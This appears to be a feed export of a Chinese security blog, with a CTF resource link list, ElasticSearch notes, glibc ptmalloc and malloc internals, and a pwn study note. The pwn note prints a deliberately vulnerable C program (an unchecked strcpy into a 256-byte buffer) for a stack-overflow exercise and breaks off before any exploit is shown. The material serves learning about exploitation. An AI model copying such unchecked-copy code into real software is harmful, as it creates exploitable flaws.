href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.programcreek.com%2Fjava-api-examples%2F%3Faction%3Dsearch" target="_blank" rel="noopener">https://www.programcreek.com/java-api-examples/?action=search</a><br> web安全基础（解压密码：xindong）：<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fpan.baidu.com%2Fs%2F1xyAXrQceq9bUzfBrYc4bBA" target="_blank" rel="noopener">https://pan.baidu.com/s/1xyAXrQceq9bUzfBrYc4bBA</a></p><p>其它知识点：<br> Poc基础知识：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fpoc.evalbug.com%2Fchapter1%2F1.html" target="_blank" rel="noopener">https://poc.evalbug.com/chapter1/1.html</a><br> 对CDN的误区：<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.rinige.com%2Findex.php%2Farchives%2F772%2F" target="_blank" rel="noopener">http://www.rinige.com/index.php/archives/772/</a><br> 同时部署WAF和CDN：<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fhelp.aliyun.com%2Fknowledge_detail%2F42200.html" target="_blank" rel="noopener">https://help.aliyun.com/knowledge_detail/42200.html</a><br> Linux系统清除缓存【整理】：<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Fqiuzhi__ke%2Farticle%2Fdetails%2F70768544" target="_blank" rel="noopener">https://blog.csdn.net/qiuzhi__ke/article/details/70768544</a><br> 大马小马的区别：<br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.cnhonkerarmy.com%2Fthread-156156-1-1.html" target="_blank" rel="noopener">http://www.cnhonkerarmy.com/thread-156156-1-1.html</a><br> 面试必备之乐观锁与悲观锁：<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Fqq_34337272%2Farticle%2Fdetails%2F81072874" target="_blank" rel="noopener">https://blog.csdn.net/qq_34337272/article/details/81072874</a><br> 一套实用的渗透测试岗位面试题：<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F25582026" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/25582026</a><br> IPC<img src="https://math.jianshu.com/math?formula=%E3%80%81ADMIN" alt="、ADMIN">)、C<img src="https://math.jianshu.com/math?formula=%E3%80%81D" alt="、D">是什么?如何关闭删除Windows默认共享：<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fm.jb51.net%2Fsoftjc%2F2124.html" target="_blank" rel="noopener">https://m.jb51.net/softjc/2124.html</a><br> php下进行mysql参数化查询：<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Flpwmm%2Farticle%2Fdetails%2F50733698" target="_blank" rel="noopener">https://blog.csdn.net/lpwmm/article/details/50733698</a></p><p>闲趣文章：</p><p>2018中国白帽人才调查报告：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.anquanke.com%2Fpost%2Fid%2F170034" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170034</a></p><p>如何走进黑客世界：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.freebuf.com%2Farticles%2Fneopoints%2F190895.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/neopoints/190895.html</a></p><p>网络安全行业全景图：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FgksuSM7S-MLZ5LFz6-kjdw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/gksuSM7S-MLZ5LFz6-kjdw</a></p><h2 id="linux-kernel"><a href="#linux-kernel" class="headerlink" title="linux kernel"></a>linux kernel</h2><p>进行分析的大致流程如下：首先要会搭建环境，复现相应版本的相应漏洞，可以用gdb+qemu，也可以用另一台机器编译内核。然后查看源码并调试，这可以折腾自己喜欢的编辑器，并对照相应的补丁，了解更多细节。最后可以尝试在poc的基础上写自己的exp。自己直接阅读 Linux kernel 源码的话可能无从下手，可以先了解一下Linux内核源码目录结构，比如 drivers是设备驱动、arch是cpu相关代码、virt是虚拟化相关、security实现安全特性等等。然后从Linux内核可以被攻击的方面出发，比如系统调用、驱动、进程管理、网络，然后查找相应cve，比如CVE-2017-5123属于系统调用的漏洞。了解常见的攻击类型，比如栈溢出、堆溢出、UAF、整数溢出、race condition、权限检查不当、类型转换错误等等。了解Linux内核的防护机制，比如KASLR、SMEP、SELINUX等等。</p><h3 id="Interactive-map-of-Linux-kernel"><a href="#Interactive-map-of-Linux-kernel" class="headerlink" title="Interactive map of Linux kernel"></a>Interactive map of Linux kernel</h3><p><a href="http://www.makelinux.net/kernel_map/" target="_blank" rel="noopener">http://www.makelinux.net/kernel_map/</a></p><h2 id="书籍"><a href="#书籍" class="headerlink" title="书籍"></a>书籍</h2><h3 id="《A-Guide-to-Kernel-Exploitation-Attacking-the-Core》，Enrico-Perla-Massimiliano-Oldani"><a href="#《A-Guide-to-Kernel-Exploitation-Attacking-the-Core》，Enrico-Perla-Massimiliano-Oldani" class="headerlink" title="《A Guide to Kernel Exploitation: Attacking the Core》，Enrico Perla, Massimiliano Oldani"></a>《A Guide to Kernel Exploitation: Attacking the Core》，Enrico Perla, Massimiliano Oldani</h3><p><a href="http://library1.org/_ads/373CE0A3D91F602AC181CA04E04BDDF8" target="_blank" rel="noopener">http://library1.org/_ads/373CE0A3D91F602AC181CA04E04BDDF8</a></p><h3 id="《Linux-Kernel-Architecture》，Wolfgang-Mauerer"><a href="#《Linux-Kernel-Architecture》，Wolfgang-Mauerer" class="headerlink" title="《Linux Kernel Architecture》，Wolfgang Mauerer"></a>《Linux Kernel Architecture》，Wolfgang Mauerer</h3><p><a href="http://library1.org/_ads/43D6ABBD76FE1BD19BDE10E904CD0C79" target="_blank" rel="noopener">http://library1.org/_ads/43D6ABBD76FE1BD19BDE10E904CD0C79</a></p><h3 id="《Linux-Kernel-Development-3rd-Edition-》，Robert-Lovetorvalds"><a href="#《Linux-Kernel-Development-3rd-Edition-》，Robert-Lovetorvalds" class="headerlink" title="《Linux Kernel Development (3rd Edition) 》，Robert Lovetorvalds"></a>《Linux Kernel Development (3rd Edition) 》，Robert Lovetorvalds</h3><p><a href="http://library1.org/_ads/8799C7900BCC639DB78BC2CD0F8CB3AC" target="_blank" rel="noopener">http://library1.org/_ads/8799C7900BCC639DB78BC2CD0F8CB3AC</a></p><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><h3 id="Linux内核源码"><a href="#Linux内核源码" class="headerlink" title="Linux内核源码"></a>Linux内核源码</h3><p><a href="https://github.com/torvalds/linux" target="_blank" rel="noopener">https://github.com/torvalds/linux</a></p><h3 id="Linux各版本内核"><a href="#Linux各版本内核" class="headerlink" title="Linux各版本内核"></a>Linux各版本内核</h3><p><a href="https://www.kernel.org/pub/linux/kernel/" target="_blank" rel="noopener">https://www.kernel.org/pub/linux/kernel/</a></p><h3 id="Linux内核代码在线查看"><a href="#Linux内核代码在线查看" class="headerlink" title="Linux内核代码在线查看"></a>Linux内核代码在线查看</h3><p><a href="http://lxr.free-electrons.com/" target="_blank" rel="noopener">http://lxr.free-electrons.com</a></p><h2 id="exp及分析文章"><a href="#exp及分析文章" class="headerlink" title="exp及分析文章"></a>exp及分析文章</h2><h3 id="linux-kernel-exploits"><a href="#linux-kernel-exploits" class="headerlink" title="linux-kernel-exploits"></a>linux-kernel-exploits</h3><p><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a></p><h3 id="kernel-exploit"><a href="#kernel-exploit" class="headerlink" title="kernel exploit"></a>kernel exploit</h3><p><a href="https://github.com/lucyoa/kernel-exploits" target="_blank" rel="noopener">https://github.com/lucyoa/kernel-exploits</a></p><h3 id="kernel-heap-overflow利用"><a href="#kernel-heap-overflow利用" class="headerlink" title="kernel heap overflow利用"></a>kernel heap overflow利用</h3><p><a href="https://zhuanlan.zhihu.com/p/26674557" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/26674557</a></p><h3 id="kernel-exploit-适合入门"><a href="#kernel-exploit-适合入门" class="headerlink" title="kernel exploit(适合入门)"></a>kernel exploit(适合入门)</h3><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/kernel_pwn/kernel-exploits.pdf" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/kernel_pwn/kernel-exploits.pdf</a></p><h3 id="blackhat-kernel议题"><a href="#blackhat-kernel议题" class="headerlink" title="blackhat kernel议题"></a>blackhat kernel议题</h3><p><a href="https://www.blackhat.com/presentations/bh-usa-03/bh-us-03-cesare.pdf" target="_blank" rel="noopener">https://www.blackhat.com/presentations/bh-usa-03/bh-us-03-cesare.pdf</a></p><h2 id="FUZZ"><a href="#FUZZ" class="headerlink" title="FUZZ"></a>FUZZ</h2><h3 id="syzkaller"><a href="#syzkaller" class="headerlink" title="syzkaller"></a>syzkaller</h3><p>这个链接的前半部分的内容详细解释了如何搭建一个qemu + gdb的环境<br><a href="https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md" target="_blank" rel="noopener">https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md</a></p><h3 id="Awesome-Fuzzing"><a href="#Awesome-Fuzzing" class="headerlink" title="Awesome-Fuzzing"></a>Awesome-Fuzzing</h3><p><a href="https://github.com/secfigo/Awesome-Fuzzing" target="_blank" rel="noopener">https://github.com/secfigo/Awesome-Fuzzing</a></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="x86-64-Assembly"><a href="#x86-64-Assembly" class="headerlink" title="x86_64 Assembly"></a>x86_64 Assembly</h3><p><a href="https://0xax.github.io/categories/assembler/" target="_blank" rel="noopener">https://0xax.github.io/categories/assembler/</a></p><h3 id="64-bit-system-call-numbers-and-entry-vectors"><a href="#64-bit-system-call-numbers-and-entry-vectors" class="headerlink" title="64-bit system call numbers and entry vectors"></a>64-bit system call numbers and entry vectors</h3><p><a href="https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl" target="_blank" rel="noopener">https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl</a></p><h3 id="翻过的文章记录"><a href="#翻过的文章记录" class="headerlink" title="翻过的文章记录"></a>翻过的文章记录</h3><p>深入理解linux系统下proc文件系统内容<br><a href="http://www.cnblogs.com/cute/archive/2011/04/20/2022280.html" target="_blank" rel="noopener">http://www.cnblogs.com/cute/archive/2011/04/20/2022280.html</a><br>What is mode_t in C?<br><a href="https://jameshfisher.com/2017/02/24/what-is-mode_t.html" target="_blank" rel="noopener">https://jameshfisher.com/2017/02/24/what-is-mode_t.html</a><br>Understanding a Kernel Oops!<br><a href="http://opensourceforu.com/2011/01/understanding-a-kernel-oops/" target="_blank" rel="noopener">http://opensourceforu.com/2011/01/understanding-a-kernel-oops/</a><br>Linux Kernel Procfs Guide<br><a href="https://kernelnewbies.org/Documents/Kernel-Docbooks?action=AttachFile&amp;do=get&amp;target=procfs-guide_2.6.29.pdf">https://kernelnewbies.org/Documents/Kernel-Docbooks?action=AttachFile&amp;do=get&amp;target=procfs-guide_2.6.29.pdf</a><br>用户空间与内核空间数据交换的方式(2)——procfs<br><a href="http://www.cnblogs.com/hoys/archive/2011/04/10/2011141.html" target="_blank" rel="noopener">http://www.cnblogs.com/hoys/archive/2011/04/10/2011141.html</a><br>用户空间和内核空间传递数据：get_user；put_user;copy_to_user;copy_from_user<br><a href="http://www.cnblogs.com/wanghetao/archive/2012/06/02/2532225.html" target="_blank" rel="noopener">http://www.cnblogs.com/wanghetao/archive/2012/06/02/2532225.html</a><br>谈结构体struct 初始化多出的点号“.”，数组[]初始化多出的逗号“,”<br><a href="https://blog.csdn.net/comwise/article/details/9087279" target="_blank" rel="noopener">https://blog.csdn.net/comwise/article/details/9087279</a><br>Root exploit for Android and Linux（CVE-2010-4258）<br><a href="https://blog.csdn.net/hu3167343/article/details/36892563" target="_blank" rel="noopener">https://blog.csdn.net/hu3167343/article/details/36892563</a></p><p>思维导图：</p><p><img src="https://img-blog.csdnimg.cn/20190728162957829.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RSb25kb25n,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;CTF-学习资料整理&quot;&gt;&lt;a href=&quot;#CTF-学习资料整理&quot; class=&quot;headerlink&quot; title=&quot;CTF 学习资料整理&quot;&gt;&lt;/a&gt;CTF 学习资料整理&lt;/h2&gt;&lt;p&gt;多个地方转载整理：&lt;/p&gt;
&lt;p&gt;php代码解密&lt;a href=&quot;https
      
    
    </summary>
    
    
      <category term="ctf" scheme="http://www.mydreamdll.xyz/categories/ctf/"/>
    
    
      <category term="ctf" scheme="http://www.mydreamdll.xyz/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>ElasticSearch基本原理介绍</title>
    <link href="http://www.mydreamdll.xyz/2020/02/10/es%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D/"/>
    <id>http://www.mydreamdll.xyz/2020/02/10/es%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D/</id>
    <published>2020-02-10T01:59:02.217Z</published>
    <updated>2020-02-10T01:57:41.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ElasticSearch基本原理介绍"><a href="#ElasticSearch基本原理介绍" class="headerlink" title="ElasticSearch基本原理介绍"></a>ElasticSearch基本原理介绍</h2><h3 id="索引结构"><a href="#索引结构" class="headerlink" title="索引结构"></a>索引结构</h3><p>在存储结构上，由_index, _type和_id唯一标示一个文档。_index指向一个或者多个物理分片的逻辑命名空间，_type类型用于区分同一个集合中的不同的细分。_id文档标识符由系统自动生成或者使用者提供。</p><h3 id="分片"><a href="#分片" class="headerlink" title="分片"></a>分片</h3><p>ES将数据副本分为主从两个部分，即主分片和副分片。主分片为权威数据，写过程先写主分片，成功之后再写副分片，恢复过程以主分片为主。 </p><h3 id="集群内部原理"><a href="#集群内部原理" class="headerlink" title="集群内部原理"></a>集群内部原理</h3><p>集群节点角色：</p><ol><li>主节点</li></ol><p>主节点负责集群层面的相关操作，管理集群变更</p><p>通过配置node.master:true节点具有被选举为master的资格，主节点是全局唯一的，将从有资格成为master的节点中进行选举。</p><p>主节点也可以成为数据节点，但尽可能的做少量的工作，因此生产环境应尽量分离主节点和数据节点，创建独立节点的配置：</p><p>node.master: true</p><p>node.data: false</p><p>为了防止数据丢失，每个主节点应该知道有资格成为主节点的数目，默认为1，为了避免网络分区时候出现多主的情况，配置discovery.zen.minimum_master_nodes原则上最小值应该是（master_eligible_nodes/2）+1</p><ol start="2"><li>数据节点</li></ol><p>负责保存数据，执行数据相关操作，CRUD，搜索，聚合等，数据节点对CPU，内存，IO要求较高。通过配置node.data: true来使一个节点成为数据节点。也可以通过下面的配置:</p><p>node.master: false</p><p>node.data: true</p><p>node.ingest: false</p><ol start="3"><li>预处理节点</li></ol><p>预处理节点在5.0之后引入。默认情况下在所有的节点上启用ingest，如果想在某个节点上禁用ingest，则可以添加配置node.ingest: false。也可以通过下面的配置创建一个仅用于预处理的节点：</p><p>node.master: false</p><p>node.data: false</p><p>node.ingest：false</p><ol start="4"><li>协调节点</li></ol><p>客户端请求可以发送到集群的任意节点，每个节点都知道任意文档所在的位置，然后转发这些请求，收集数据并返回给客户端，处理客户端请求的节点称为协调节点。</p><p>协调节点将请求转发给保存数据的数据节点。每个数据节点在本地执行请求，并将结果返回给协调节点，协调节点收集完数据之后将数据节点的结果合并为单个全局结果，对结果收集和排序的过程可能需要很多CPU和内存资源。</p><p>配置：</p><p>node.master: false</p><p>node.data: false</p><p>node.ingest: false</p><ol start="5"><li>部落节点</li></ol><p>允许部落节点在多个集群之间充当联合客户端</p><p>客户端的属性：</p><p>node.master: false</p><p>node.data: false</p><p>它不做主节点，不做数据节点，仅用于路由请求，本质上是一个智能负载均衡器。</p><h3 id="集群的健康度状态"><a href="#集群的健康度状态" class="headerlink" title="集群的健康度状态"></a>集群的健康度状态</h3><p>集群的健康度状态分为三种：</p><ol><li>Green: 主分片和副分片都正常运行</li><li>Yellow: 所有的主分片都正常运行，但不是所有的副分片都正常运行，意味着有单点故障的风险。</li><li>Red: 有主分片没能正常运行</li></ol><h3 id="集群扩容"><a href="#集群扩容" class="headerlink" title="集群扩容"></a>集群扩容</h3><p>当扩容集群，添加节点时候，分片会均衡地分配到集群的每个节点上，从而对索引和搜索过程进行负载均衡，这些都是系统自动完成。</p><p>分片副本实现数据冗余，从而防止硬件故障导致的数据丢失。</p><h3 id="主要内部模块介绍"><a href="#主要内部模块介绍" class="headerlink" title="主要内部模块介绍"></a>主要内部模块介绍</h3><h4 id="Cluster"><a href="#Cluster" class="headerlink" title="Cluster"></a>Cluster</h4><p>Cluster模块是主节点执行集群管理的我封装实现，管理集群状态，维护集群层面的配置信息。主要功能：</p><ul><li>管理集群状态，将新生成的集群状态发布到集群节点</li><li>调用allocation模块执行分片分配，决策那些分片应该分配到哪个节点</li><li>集群各节点中直接迁移分片，保持数据平衡</li></ul><h4 id="allocation"><a href="#allocation" class="headerlink" title="allocation"></a>allocation</h4><p>封装分片分配相关的功能和策略，包括主分片的分配和副分片的分配，本模块由主节点调用。创建新索引，集群完全重启都需要分片分配的过程</p><h4 id="Discovery"><a href="#Discovery" class="headerlink" title="Discovery"></a>Discovery</h4><p>发现模块负责发现集群中的节点，以及选举主节点。当节点加入或退出集群时，主节点会采取相应的行动。</p><h4 id="Gateway"><a href="#Gateway" class="headerlink" title="Gateway"></a>Gateway</h4><p>负责对收到Master广播下来的集群状态数据的持久化存储，并在集群完全重启时恢复他们。</p><h4 id="Indices"><a href="#Indices" class="headerlink" title="Indices"></a>Indices</h4><p>索引模块管理全局级的索引设置，不包括索引级的，它还封装了索引数据恢复功能。集群启动阶段需要的主分片恢复和副分片恢复就是在这个模块实现。</p><h4 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h4><p>HTTP模块允许通过JSON over HTTP的方式访问ES的API，HTTP模块本质上完全异步的，意味着没有阻塞线程等待响应。使用异步通信进行HTTP的好处是解决了C10k问题（10k量级的并发连接）。</p><p>在部分场景中，可考虑使用HTTP keepalive来提升性能，注意，不要在客户端使用http chunking</p><h4 id="Transport"><a href="#Transport" class="headerlink" title="Transport"></a>Transport</h4><p>传输模块用于集群内节点之间的内部通信，从一个节点到另一个节点的每个请求都使用传输模块。</p><h4 id="Engine"><a href="#Engine" class="headerlink" title="Engine"></a>Engine</h4><p>Engine模块封装了对Lucene的操作及translog的调用，它是对一个分片读写操作的最终提供者。</p><h3 id="选主算法"><a href="#选主算法" class="headerlink" title="选主算法"></a>选主算法</h3><p>bolly算法：选择ID较大的，在es中选择id较小的机器为master节点。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ElasticSearch基本原理介绍&quot;&gt;&lt;a href=&quot;#ElasticSearch基本原理介绍&quot; class=&quot;headerlink&quot; title=&quot;ElasticSearch基本原理介绍&quot;&gt;&lt;/a&gt;ElasticSearch基本原理介绍&lt;/h2&gt;&lt;h3 i
      
    
    </summary>
    
    
      <category term="ElasticSearch" scheme="http://www.mydreamdll.xyz/categories/ElasticSearch/"/>
    
    
      <category term="ElasticSearch" scheme="http://www.mydreamdll.xyz/tags/ElasticSearch/"/>
    
  </entry>
  
  <entry>
    <title>ptmalloc学习</title>
    <link href="http://www.mydreamdll.xyz/2020/01/26/ptmalloc%E5%AD%A6%E4%B9%A0/"/>
    <id>http://www.mydreamdll.xyz/2020/01/26/ptmalloc%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-01-26T11:02:18.842Z</published>
    <updated>2020-01-26T11:02:04.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ptmalloc学习"><a href="#ptmalloc学习" class="headerlink" title="ptmalloc学习"></a>ptmalloc学习</h2><p>ptmalloc2 是linux glibc中当前使用的内存堆分配。之前使用的dlmalloc，现在逐步都被支持多线程的ptmalloc来替代了。</p><p>我们之前学习过系统底层是调用的brk和mmap来实现内存分配的。</p><p>ptmalloc2多线程情况下分配内存的时候，每个线程有一个独立的heap segment和freelist数据结构保持于其他堆独立。这个行为我们称作为per thread arena;</p><p>需要注意的是，即使用户请求内存只有1000字节，堆内存分配的时候还是会提供132KB大小被创建。这种连续的堆内存区域我们称作为arena。主线程创建的我们称作为main arena;</p><p>如果当程序超过了这个arena区域可用空寂哦哦安的时候，他能够增加通过程序break位置的方式。top chunk大小可以适配 extra space空间。类似的如果有很多可用空间在top chunk中的时候，他可以缩小。</p><p>除了这个1ＭＢ的堆分配外，只有132KB的读写权限被设置，因此这个连续的内存区域被称作为thread arena;如果超过128KB（132*1024）请求大小，超过了malloc可用空间的时候，内存分配通过使用mmap系统调用来申请，无论请求来自于main arena还是thread arena; arena的限制来自于系统的cores数目；</p><p>32bit: Number of arena = 2 * number of cores;</p><p>63bit: Number of arena = 8 * number of cores;</p><p>heap的主要信息有下面这些：</p><p>heap_info： heap header信息，单线程thread arena能有多堆。</p><p>malloc_state: arena header</p><p>malloc_chunk:  chunk_header</p><p>main arena因为没有多heap，所以没有heap_info。不像thread arena，main arena header不是sbrk的 heap segment的一部分。他是一个全局变量，因此可以在libc.so data segment找到。</p><p><img src="https://docs.google.com/drawings/d/1367fdYcRTvkyfZ_s27yg6oJp5KYsVAuYqPf8szbRNc0/pub?w=960&h=720" alt="img"></p><p><img src="https://docs.google.com/drawings/d/1367fdYcRTvkyfZ_s27yg6oJp5KYsVAuYqPf8szbRNc0/pub?w=960&h=720" alt="img"></p><p><img src="https://docs.google.com/drawings/d/150bTi0uScQlnABDImLYS8rWyL82mmfpMxzRbx-45UKw/pub?w=960&h=720" alt="img"></p><p>chunk: 一个chunk包含在一个heap segment中，包括以下几个：</p><ol><li><p>allocated chunk</p><p><img src="https://docs.google.com/drawings/d/1eLkG-WF9U3O_ytNs6iFKHacqkjWZeY4KtLqxmd01EVs/pub?w=962&h=682" alt="img"></p></li><li><p>free chunk</p><p><img src="https://docs.google.com/drawings/d/1YrlnGa081NpO0D3wcoaJbGvhnPi3X6bBKMc3bN4-oZQ/pub?w=940&h=669" alt="img"></p><p>其中 bins是freelist的数据结构，在free chunk中被使用。</p><p>fast bin, unsorted bin, small bin, large bin</p><p>fastbinsY： 这个数组支持fastbins</p><p>bins: bin1  unsorted bin, bin2-bin63 small bin, bin64-bin126 large bin;</p><p>fastbin: chunk大小在16-80字节被称作为fast chunk;</p><p><img src="https://docs.google.com/drawings/d/144diIfbLqUmOPlAWbtP45mGsZlIl3PZWJvvH-cvQziU/pub?w=960&h=720" alt="img"></p><p>unsorted bin: </p><p>当释放小块或大块时，而不是将它们添加到各自的容器，将他们释放的空间放入unsortedbin中。这种方式给了glibc malloc重用最近释放的chunk的机会。因此，内存分配和释放会加快一点。因为寻找合适的垃圾箱所花费的时间减少了。</p><p><img src="https://docs.google.com/drawings/d/1Kf_eg7uB2mRjSOasTc4dIu5fuBpTAK0GxbnKVTkZd0Y/pub?w=1217&h=865" alt="img"></p><p>small bin: chunk小于512字节的被称作为small chunk;</p><p>large bin: chunk大于512字节的被称作为large chunk;</p></li><li><p>Top Chunk：</p><p>在top边界上的arena被称作为top chunk;</p></li><li><p>Last Remainder Chunk：</p><p>从最近的一个小请求分裂。最后的剩余块有助于改善引用的局部性，即小块的连续的malloc请求可能最终被分配到彼此接近的地方。</p></li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/" target="_blank" rel="noopener">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/</a></p><p><a href="https://www.cnblogs.com/alisecurity/p/5486458.html" target="_blank" rel="noopener">https://www.cnblogs.com/alisecurity/p/5486458.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ptmalloc学习&quot;&gt;&lt;a href=&quot;#ptmalloc学习&quot; class=&quot;headerlink&quot; title=&quot;ptmalloc学习&quot;&gt;&lt;/a&gt;ptmalloc学习&lt;/h2&gt;&lt;p&gt;ptmalloc2 是linux glibc中当前使用的内存堆分配。之前使用
      
    
    </summary>
    
    
      <category term="malloc" scheme="http://www.mydreamdll.xyz/categories/malloc/"/>
    
    
      <category term="malloc" scheme="http://www.mydreamdll.xyz/tags/malloc/"/>
    
  </entry>
  
  <entry>
    <title>Linux Malloc底层分配原理【翻译】</title>
    <link href="http://www.mydreamdll.xyz/2020/01/24/linux%E5%86%85%E5%AD%98malloc%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/"/>
    <id>http://www.mydreamdll.xyz/2020/01/24/linux%E5%86%85%E5%AD%98malloc%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/</id>
    <published>2020-01-24T06:56:22.335Z</published>
    <updated>2020-01-24T06:56:01.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Linux-Malloc底层分配原理【翻译】"><a href="#Linux-Malloc底层分配原理【翻译】" class="headerlink" title="Linux Malloc底层分配原理【翻译】"></a>Linux Malloc底层分配原理【翻译】</h2><p>linux中malloc函数还是通过syscall来分配内存的。通过调用brk或者mmap syscall函数来分配内存。</p><p><img src="https://docs.google.com/drawings/d/105HDvkEvIW2lsyaQjj758Lbyx6A-_K7jviheyzeAwl8/pub?w=480&h=238" alt="img"></p><p>brk函数：从内核分配内存（非0初始化）通过增加程序break位置来实现。初始化堆segment得开始与结束指向相同的位置。</p><p>如果ASLR关闭的时候，start_brk和brk将指向data/bss segment结束的位置。</p><p>如果ASLR打开的时候，start_brk和brk将等于data/bss segment结束的位置通过随机brk offset</p><p><img src="https://i2.wp.com/static.duartes.org/img/blogPosts/linuxFlexibleAddressSpaceLayout.png" alt="img"></p><p>mmap: malloc函数使用mmap来创建一个私有匿名映射segment.分配私有匿名的主要目的是分配一个新的内存（0填充的）这个新的内存将被调用进程的时候额外使用。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/" target="_blank" rel="noopener">https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/</a></p><p><a href="https://manybutfinite.com/post/anatomy-of-a-program-in-memory/" target="_blank" rel="noopener">https://manybutfinite.com/post/anatomy-of-a-program-in-memory/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Linux-Malloc底层分配原理【翻译】&quot;&gt;&lt;a href=&quot;#Linux-Malloc底层分配原理【翻译】&quot; class=&quot;headerlink&quot; title=&quot;Linux Malloc底层分配原理【翻译】&quot;&gt;&lt;/a&gt;Linux Malloc底层分配原理【翻
      
    
    </summary>
    
    
      <category term="malloc" scheme="http://www.mydreamdll.xyz/categories/malloc/"/>
    
    
      <category term="malloc" scheme="http://www.mydreamdll.xyz/tags/malloc/"/>
    
  </entry>
  
  <entry>
    <title>pwn学习笔记1</title>
    <link href="http://www.mydreamdll.xyz/2020/01/23/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://www.mydreamdll.xyz/2020/01/23/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-01-23T03:05:13.595Z</published>
    <updated>2020-01-23T03:04:09.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="pwn学习笔记1"><a href="#pwn学习笔记1" class="headerlink" title="pwn学习笔记1"></a>pwn学习笔记1</h2><h3 id="学习笔记"><a href="#学习笔记" class="headerlink" title="学习笔记"></a>学习笔记</h3><p>其实参考的是<a href="https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/文章中的教程，学习下pwn的基础知识。" target="_blank" rel="noopener">https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/文章中的教程，学习下pwn的基础知识。</a></p><p>环境：ubuntu14.04</p><p>漏洞代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vuln.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">        <span class="comment">/* [1] */</span> <span class="keyword">char</span> buf[<span class="number">256</span>];</span><br><span class="line">        <span class="comment">/* [2] */</span> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="comment">/* [3] */</span> <span class="built_in">printf</span>(<span class="string">"Input:%s\n"</span>,buf);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实就是简单的栈溢出利用，超过256个字符的时候会发生栈溢出问题。</p><p>首先我们需要关闭内存地址随机化。保证栈溢出地址固定。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span 